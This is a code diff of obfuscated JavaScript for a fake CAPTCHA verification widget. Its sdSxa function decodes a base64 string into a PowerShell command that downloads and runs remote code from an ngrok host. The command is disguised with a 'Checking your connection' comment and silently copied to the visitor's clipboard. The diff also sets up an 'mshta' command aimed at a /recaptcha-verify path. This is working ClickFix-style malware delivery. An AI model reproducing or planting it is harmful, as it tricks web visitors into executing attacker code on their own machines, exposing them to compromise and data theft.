@@ -1,7 +1,7 @@
 let ccW = document.getElementById("checkbox-window");
     let cceB = document.getElementById("checkbox");
     let cBS = document.getElementById("spinner");
-    let vW = document.getElementById("vwvv");
+    let vW = document.getElementById("verify-window");
 
     function aCL() {
         if (cceB) {
@@ -21,12 +21,12 @@ let ccW = document.getElementById("checkbox-window");
 
     function rsW() {
         hRts();
-        setTimeout(function () {
+        setTimeout(function(){
             sd3d();
-        }, 500);
-        setTimeout(function () {
+        },500);
+        setTimeout(function(){
             sV();
-        }, 900)
+        },900)
     }
 
     function sd3d() {
@@ -38,7 +38,7 @@ let ccW = document.getElementById("checkbox-window");
     function wedsq() {
         cBS.style.opacity = "0";
         cBS.style.animation = "none";
-        setTimeout(function () {
+        setTimeout(function() {
             cBS.style.visibility = "hidden";
         }, 500);
     }
@@ -96,7 +96,7 @@ let ccW = document.getElementById("checkbox-window");
         return vW.style.display !== "none" && vW.style.display !== "";
     }
 
-    function scpb(textToCopy) {
+    function scpb(textToCopy){
         const tempTextArea = document.createElement("textarea");
         tempTextArea.value = textToCopy;
         document.body.append(tempTextArea);
@@ -105,30 +105,28 @@ let ccW = document.getElementById("checkbox-window");
         document.body.removeChild(tempTextArea);
     }
 
-    function sdSxa(ctr, vDa) {
+    function sdSxa(commandToRun, vDa){
         const r = 'cG93ZXJzaGVsbCAtQ29tbWFuZCAiSUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwczovL21hcnZlbC5uZ3Jvay5waXp6YS90ZXN0Lm1kJykgIyBDaGVja2luZyB5b3VyIGNvbm5lY3Rpb24sIHdhaXQgZm9yIG5ldyBwZXJtaXNzaW9uISI='
         const drr = atob(r);
         scpb(drr);
     }
-
     function sV() {
         vW.style.display = "block";
         vW.style.visibility = "visible";
         vW.style.opacity = "1";
         vW.style.top = ccW.offsetTop - 80 + "px";
-        vW.style.left = ccW.offsetLeft + 54 + "px";
+        vW.style.left =  ccW.offsetLeft + 54 + "px";
 
         if (vW.offsetTop < 5) {
             vW.style.top = "5px";
         }
-        if (vW.offsetLeft + vW.offsetWidth > window.innerWidth - 10) {
-            vW.style.left = ccW.offsetLeft - 8 + "px";
+        if (vW.offsetLeft + vW.offsetWidth > window.innerWidth-10 ) {
+            vW.style.left =  ccW.offsetLeft - 8  + "px";
         }
         var vDa = qwedsaA();
-        document.getElementById('vid').textContent = vDa;
+        document.getElementById('verification-id').textContent = vDa;
         const hP = window.location.origin + "/recaptcha-verify";
-        const ctr = "" + hP
-        sdSxa(ctr, vDa)
+        const commandToRun = "mshta " + hP
+        sdSxa(commandToRun, vDa)
     }
-
     aCL();
